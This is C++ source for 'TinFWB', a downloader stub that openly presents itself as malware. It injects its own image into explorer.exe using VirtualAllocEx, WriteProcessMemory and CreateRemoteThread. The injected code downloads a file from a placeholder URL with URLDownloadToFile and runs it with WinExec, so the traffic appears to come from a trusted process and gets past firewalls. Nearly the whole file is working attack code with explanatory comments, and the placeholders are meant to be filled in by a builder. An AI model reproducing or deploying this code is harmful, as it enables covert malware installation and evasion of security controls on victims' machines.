/////////////////////////////////////////////////////
//	TinFWB C++ Source by r3L4x
//	Downloaded from r3L4x.com
//	released under GNU contract thingy - ha!
//	(like i give a flying fuck what you do with it)
/////////////////////////////////////////////////////

//   //		///////   ///
//   //		  //      ///
//   //		  //	  ///
///////		  //	  //
//   //		  //	  
//   //		///////   //

//these are optomizations to make the exe smaller
//it merges sections so it gets the exe size down
//and sets the image base so it will work while in
//other processes 
#pragma comment(linker,"/SECTION:.text,EWR /IGNORE:4078 /FILEALIGN:0x200")
#pragma comment(linker,"/OPT:NOWIN98 /STUB:stub.exe  /BASE:0x13140000 /INCREMENTAL:NO") 
#pragma comment(linker,"/ENTRY:Entrypoint /MERGE:.rdata=.text /MERGE:.data=.text") 
#pragma comment(lib, "srt.lib") /*EliRT*/
#pragma comment(lib, "msvcrt.lib") /*Smallness :)*/
#pragma comment(lib, "urlmon.lib") /*For URLDownloadToFile*/

//Headers (windows.h has all win32 api calls)
#include <windows.h>
//this has the info for the elirt calls xVirtualFreeEx, xVirtualAllocEx, xCreateRemoteThread
//to the compiler knows what to do
#include <EliRT.h>

//this is the procedure thats called with xCreateRemoteThread
//this code gets executed in the other processes space,
//so it seems like its coming from them, and you get all the
//privleges they get
unsigned long inject (void *)
{
	//the ** and && are spacers so the editor know what to 
	//look for and replace
	URLDownloadToFile(0, "**************************************************", "&&&&&&&&&&&&&&&&&&&&", 0, 0);
	//open it up
	WinExec("&&&&&&&&&&&&&&&&&&&&", SW_SHOW);
	//exit thread instead of process, so it wont kill explorer.exe
	//when we end what we are doing. 
	ExitThread(0);
	return 0;
}

void Entrypoint()
{
	DWORD Size;  
	PBYTE module;
	
	//get the full path to our exe
	module = (PBYTE)GetModuleHandle(0);
	//get the size of our exes image so we know how much space to allocate 
	//in the other processes memory
	Size = ((PIMAGE_NT_HEADERS)(module+((PIMAGE_DOS_HEADER)module)->e_lfanew))->OptionalHeader.SizeOfImage;

	//variables
	HWND window;
	HANDLE process;
	DWORD pidwin;
	LPVOID m2;

	//Explorer.exe's handle
	window = FindWindow("shell_traywnd", NULL); 

	//get pid (process id) by its window handle 
	GetWindowThreadProcessId(window, &pidwin);
	//open the process so we can modify it
	process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pidwin);
	//free space in the process
	xVirtualFreeEx(process, module, 0, MEM_RELEASE);
	//allocate the freed space
	m2 = xVirtualAllocEx(process, module, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//write our self to their memory
	WriteProcessMemory(process, m2, module, Size, NULL);
	//start the thread up!!
	xCreateRemoteThread(process, 0, 0, inject, module, 0, NULL);
	
}

